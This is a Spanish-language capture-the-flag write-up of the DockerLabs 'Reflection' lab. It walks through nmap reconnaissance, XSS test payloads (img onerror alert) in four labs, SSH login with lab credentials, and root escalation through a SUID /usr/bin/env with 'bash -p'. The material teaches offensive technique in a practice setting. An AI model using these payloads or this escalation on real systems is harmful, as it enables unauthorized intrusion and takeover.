*AUTOR:El Pingüino de Mario*

## CÓMO DESPLEGAR EL DOCKER
-Descargamos el zip desde esta web:
```bash
https://www.dockerlabs.es/#/
```
la máquina elegida es Reflection
```bash
https://mega.nz/file/SAtzAKLL#3ITizYrmaj4-aP1AyjuzHGMoZuSGeiO8lcfIMBOzaqk
```
movemos el zip a la carpeta que deseamos
```bash
mv /home/kali/Downloads/reflection.zip .
```
*Explicación:*

mv - comando para indicar move (mover a)

/home/kali/Downloads/reflection.zip - ruta donde lo hemos descargado

. - indica aquí

mover - lo que hay en esta ruta - aquí

ahora tenemos un archibo llamado reflection.zin en la carpeta donde estamos trabajando,

*1º hay que descomprimir*

```bash
unzip reflection.zip
```

por limpirza eliminamos el archivo zip original ya que tenemos el contenido extraido

```bash
rm reflection.zip
```

**TOCA DESPLEGAR EL DOCKER**

Si listamos el contenido descargado tenemos:
```bash
 ls -la
```
```
drwxr-xr-x 3 kali kali      4096 ene 17 07:38 .
drwxr-xr-x 4 kali kali      4096 ene 17 07:37 ..
-rwxr-xr-x 1 kali kali      5250 dic 22 04:39 auto_deploy.sh
-rw------- 1 kali kali 342773248 dic 27 06:00 reflection.tar
```
usamos este comando:
```bash
sudo bash auto_deploy.sh reflection.tar
```

*explicación:*
-sudo: necesitamos privilegios root para usar docker
-bash: el interprete que ejecuta el script
-reflection.tar argumento necesario para el scrip

##FASE DE RECONOCIMIENTO

Vamos a mirar que puertos tiene abierta la máquina, que servicio corre en elllos y su versión:

```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN PuertosYservicios
```
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 89:6c:a5:af:d5:e2:83:6c:f9:87:33:44:0f:78:48:3a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMps8s+30oFAKg2941FBb6ll6Wz5WNZOVIZRGUJGalfdnfePoKGgyGnxQBLJCH4ewP7EvGTD+ge0gGr0FIzeMPk=
|   256 65:32:42:95:ca:d0:53:bb:28:a5:15:4a:9c:14:64:5b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMt8jE0CMbImPmdadSD5x0yuU9HV0ZU5FWVG5FcbJ2KV
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Laboratorio de Cross-Site Scripting (XSS)
|_http-server-header: Apache/2.4.62 (Debian)
```
tenemos dos puertos:

-puerto 80 donde corre el sericio http

-puerto 22 dónde corre SSH con una versión no vulnerable

Nos centramos en el puerto 80, antes de abrir en el navegador lanzamos un whatweb para ver si  nos reporta algo interesante:
```bash
whatweb http://172.17.0.2 | tee whatweb
```

*explicación:*

-whatweb:Es una herramienta utilizada para identificar información sobre un sitio web o un servidor web.

-http://172.17.0.2: ip a la que dirigimos la herramienta

-| (pipe):El operador pipe (|) redirige la salida del comando de la izquierda (whatweb) al comando de la derecha (tee).

-tee:Este comando toma la salida estándar de whatweb y la duplica, muestra la salida en la pantalla y la guarda en un archivio llamado whatweb

-watweb: archivo donde guarda la salida tee

```
http://172.17.0.2 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2], Script, Title[Laboratorio de Cross-Site Scripting (XSS)]
```
nada relevante, así pues vamos a la web:

## FASE INTRUSIÓN Y PRUEBAS EN ESTE CASO
Vemos 4 laboratorios:

-Laboratorio1 (reflected XSS) 
Nos dirigimos a el e inyectamos este comando:
```bash
<h1>Hola caraculo</h1>
```
o este otro
```bash
'"><img src=x onerror=alert(1) />
```

-Laboratorio2 (stored XSS)
Nos dirigimos y ejecutamos:
```bash
<h1>XSS</h1>
```
```bash
<p style="color:blue;">COLOR_AZUL</p>
```

```bash
'"><img src=x onerror=alert(1) />
```

```bash
<h1>Hola caraculo</h1>
```

-laboratorio3 (XSS con Dropdowns)
cacharreando dando a las opciones en la barra de navegador podemos ver esto:
```
http://172.17.0.2/laboratorio3/?opcion1=ValorA&opcion2=&opcion3=
```
aqui vamos a inyectar el XSS:
```bash
http://172.17.0.2/laboratorio3/?opcion1=ValorA&opcion2=&opcion3=<h1>HOLA</h1>
```
```bash
http://172.17.0.2/laboratorio3/?opcion1=ValorA&opcion2=&opcion3=<img src="x" onerror="alert(1)" />
```


-laboratorio4 (Reflected XSS a traves de la URL)
 podemos leer esto :
 ```
No hay contenido en el parámetro 'data'.
```
lo cual nos hace pensar que se puede  inyectar cosas en el parametro dara, así que lo insertamos en la url:
URL original :
```
http://172.17.0.2/laboratorio4/
```

url con el parametro data:

```bash
http://172.17.0.2/laboratorio4/?data=<h1>Hola</h1>
```
```bash
http://172.17.0.2/laboratorio4/?data=<img src="x" onerror="alert(1)" />
```


##LAS INYECCIONES PUEDEN OBTENERSE DESDE VARIOS SITIOS, YO RECOMIENDO 
```bash
https://book.hacktricks.wiki/en/index.html
```
en el buscador poneis XSS y os aparece mucha información
También:
```bash
https://swisskyrepo.github.io/PayloadsAllTheThings
```
en el buscador XSS y lo mismo

##FASE INTRUSIÓN PARTE 2

ahora por fin podemos darle al botón:
```bash
Click aquí cuando Hayas Completado los Laboratorios
```

y nos aparece esto:
```
Accede por SSH con estas credenciales SOLO cuando hayas completado los retos anteriores.
En caso contrario, el Writeup que subas a DockerLabs.es no se tendrá en cuenta.

Usuario: balu
Password: balulero
```

el user y pass para el ssh, así pues nos conectamos con ssh:
```bash
ssh balu@172.17.0.2
```
suelo ir en este orden:
1-listar grupos a los que pertenezco:
```bash
id
```
```
uid=1000(balu) gid=1000(balu) groups=1000(balu),100(users)
```
nada fuera de lo normal
2-mirar variable de entorno:
```bash
printenv
```
nada interesante
3- cat al /etc/passwd para saber usuarios del sistema
```bash
cat /etc/passwd | grep sh$
```
```
root:x:0:0:root:/root:/bin/bash
balu:x:1000:1000:balu,,,:/home/balu:/bin/bash
balulito:x:1001:1001:balulito,,,:/home/balulito:/bin/bash
```
aparte del user balu que es el que somos tenemos balulito y root, esto puede suponer que hay que pivotar a otro usuario y luego a root

4- privilegios con sudo -l
```bash
sudo -l
```
nada 

5- mirar suid y capability

aquí con el suid me valió
```bash
find / -perm -4000 2>/dev/null
```
```
/usr/bin/chfn
/usr/bin/env
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

tenemos por ahí /usr/bin/env que no suele estar, vamos a la página:
```bash
https://gtfobins.github.io/
```
el el buscador introducimos
```
env
```
y de este binario podemos consultar /Shell/SUID/Sudo

como vimos tiene privilegios suid, podemos comprobarlo así:
```bash
ls -la /usr/bin/env
```
```
-rwsr-xr-x 1 root root 48536 Sep 20  2022 /usr/bin/env
```
ahí podemos ver la s de suid

en gtfobin nos dice esto en la parte SUI:

```
./env /bin/sh -p
```

entonces lo adaptamos a nuestras necesidades:

```bash
/usr/bin/env /bin/bash -p
```

lo ejecutamos y:
```
balu@6858f5cbddcc:~$ /usr/bin/env /bin/bash -p
bash-5.2# id
uid=1000(balu) gid=1000(balu) euid=0(root) groups=1000(balu),100(users)
bash-5.2# whoami
root
bash-5.2# 
```









